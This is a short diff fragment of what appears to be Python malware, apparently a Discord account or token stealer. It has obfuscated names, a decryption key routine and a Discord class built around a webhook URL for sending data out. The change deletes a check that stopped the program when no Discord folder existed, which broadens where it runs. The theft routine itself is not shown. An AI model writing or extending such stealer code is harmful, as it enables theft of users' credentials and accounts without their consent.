@@ -5,9 +5,6 @@ quicaa = encKey.getKey()
 qickaa = decryption.quicka()
 string = '-' * 82
 
-if not os.path.isdir(os.getenv("appdata") + f"\\discord"):
-    sys.exit()
-
 class Discord:
     def __init__(self, webhook_url) -> None:
         self.nitro = None
